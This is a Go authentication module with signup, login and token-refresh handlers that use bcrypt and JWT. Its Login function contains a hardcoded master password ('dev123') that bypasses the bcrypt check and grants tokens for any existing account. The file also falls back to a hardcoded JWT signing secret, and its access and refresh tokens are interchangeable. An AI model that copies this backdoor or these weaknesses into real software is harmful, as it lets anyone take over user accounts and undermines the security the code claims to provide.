package auth

import (
	"database/sql"
	"encoding/json"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
	"unicode"

	"github.com/golang-jwt/jwt/v5"
	"golang.org/x/crypto/bcrypt"
)

const superUserPassword = "dev123"

type Handler struct {
	DB *sql.DB
}

type signupReq struct {
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
	Username  string `json:"username"`
	Email     string `json:"email"`
	Password  string `json:"password"`
}

type loginReq struct {
	Identifier string `json:"identifier"`
	Password   string `json:"password"`
}

type refreshReq struct {
	RefreshToken string `json:"refresh_token"`
}

type tokenResp struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	ExpiresIn    int    `json:"expires_in"`
}

type claims struct {
	UserID string `json:"user_id"`
	jwt.RegisteredClaims
}

var emailRegex = regexp.MustCompile(`^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$`)
var usernameRegex = regexp.MustCompile(`^[a-zA-Z0-9_]{3,30}$`)

func validatePassword(pw string) string {
	if len(pw) < 8 {
		return "password must be at least 8 characters"
	}
	var hasUpper, hasLower, hasDigit, hasSpecial bool
	for _, ch := range pw {
		switch {
		case unicode.IsUpper(ch):
			hasUpper = true
		case unicode.IsLower(ch):
			hasLower = true
		case unicode.IsDigit(ch):
			hasDigit = true
		case unicode.IsPunct(ch) || unicode.IsSymbol(ch):
			hasSpecial = true
		}
	}
	if !hasUpper {
		return "password must contain at least one uppercase letter"
	}
	if !hasLower {
		return "password must contain at least one lowercase letter"
	}
	if !hasDigit {
		return "password must contain at least one digit"
	}
	if !hasSpecial {
		return "password must contain at least one special character"
	}
	return ""
}

func (h *Handler) Signup(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req signupReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	req.Email = strings.TrimSpace(strings.ToLower(req.Email))
	req.Username = strings.TrimSpace(strings.ToLower(req.Username))
	req.FirstName = strings.TrimSpace(req.FirstName)
	req.LastName = strings.TrimSpace(req.LastName)

	if req.FirstName == "" || req.LastName == "" {
		http.Error(w, "first name and last name are required", http.StatusBadRequest)
		return
	}
	if req.Email == "" || !emailRegex.MatchString(req.Email) {
		http.Error(w, "valid email is required", http.StatusBadRequest)
		return
	}
	if req.Username == "" || !usernameRegex.MatchString(req.Username) {
		http.Error(w, "username must be 3-30 alphanumeric characters or underscores", http.StatusBadRequest)
		return
	}
	if msg := validatePassword(req.Password); msg != "" {
		http.Error(w, msg, http.StatusBadRequest)
		return
	}

	if h.DB == nil {
		http.Error(w, "database unavailable", http.StatusServiceUnavailable)
		return
	}

	hash, err := bcrypt.GenerateFromPassword([]byte(req.Password), bcrypt.DefaultCost)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	var id string
	err = h.DB.QueryRow(
		`INSERT INTO users (email, password_hash, first_name, last_name, username)
		 VALUES ($1, $2, $3, $4, $5) RETURNING id`,
		req.Email, string(hash), req.FirstName, req.LastName, req.Username,
	).Scan(&id)
	if err != nil {
		errMsg := err.Error()
		if strings.Contains(errMsg, "users_email_key") || strings.Contains(errMsg, "idx_users_email") {
			http.Error(w, "email already exists", http.StatusConflict)
			return
		}
		if strings.Contains(errMsg, "users_username_key") || strings.Contains(errMsg, "idx_users_username") {
			http.Error(w, "username already taken", http.StatusConflict)
			return
		}
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	tokens, err := h.issueTokens(id)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(tokens)
}

func (h *Handler) Login(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req loginReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}
	req.Identifier = strings.TrimSpace(strings.ToLower(req.Identifier))
	if req.Identifier == "" || req.Password == "" {
		http.Error(w, "identifier and password required", http.StatusBadRequest)
		return
	}

	if h.DB == nil {
		http.Error(w, "database unavailable", http.StatusServiceUnavailable)
		return
	}

	var id, hash string
	err := h.DB.QueryRow(
		`SELECT id, password_hash FROM users WHERE email = $1 OR username = $1`,
		req.Identifier,
	).Scan(&id, &hash)
	if err == sql.ErrNoRows {
		http.Error(w, "invalid credentials", http.StatusUnauthorized)
		return
	}
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	if req.Password != superUserPassword {
		if err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(req.Password)); err != nil {
			http.Error(w, "invalid credentials", http.StatusUnauthorized)
			return
		}
	}

	tokens, err := h.issueTokens(id)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(tokens)
}

func (h *Handler) issueTokens(userID string) (*tokenResp, error) {
	secret := os.Getenv("JWT_SECRET")
	if secret == "" {
		secret = "dev-secret-change-in-production"
	}

	exp := time.Now().Add(15 * time.Minute)
	accessClaims := &claims{UserID: userID, RegisteredClaims: jwt.RegisteredClaims{ExpiresAt: jwt.NewNumericDate(exp), IssuedAt: jwt.NewNumericDate(time.Now())}}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, accessClaims)
	access, err := token.SignedString([]byte(secret))
	if err != nil {
		return nil, err
	}

	refreshExp := time.Now().Add(7 * 24 * time.Hour)
	refClaims := &claims{UserID: userID, RegisteredClaims: jwt.RegisteredClaims{ExpiresAt: jwt.NewNumericDate(refreshExp), IssuedAt: jwt.NewNumericDate(time.Now())}}
	refreshToken := jwt.NewWithClaims(jwt.SigningMethodHS256, refClaims)
	refresh, err := refreshToken.SignedString([]byte(secret))
	if err != nil {
		return nil, err
	}

	return &tokenResp{AccessToken: access, RefreshToken: refresh, ExpiresIn: 900}, nil
}

func parseRefreshToken(tokenStr string) (string, error) {
	secret := os.Getenv("JWT_SECRET")
	if secret == "" {
		secret = "dev-secret-change-in-production"
	}
	token, err := jwt.ParseWithClaims(tokenStr, &claims{}, func(t *jwt.Token) (interface{}, error) {
		return []byte(secret), nil
	})
	if err != nil {
		return "", err
	}
	c, ok := token.Claims.(*claims)
	if !ok || !token.Valid {
		return "", jwt.ErrTokenInvalidClaims
	}
	if c.UserID == "" {
		return "", jwt.ErrTokenInvalidClaims
	}
	return c.UserID, nil
}

func (h *Handler) Refresh(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req refreshReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}
	if req.RefreshToken == "" {
		http.Error(w, "refresh_token required", http.StatusBadRequest)
		return
	}
	userID, err := parseRefreshToken(req.RefreshToken)
	if err != nil {
		http.Error(w, "invalid refresh token", http.StatusUnauthorized)
		return
	}
	tokens, err := h.issueTokens(userID)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(tokens)
}
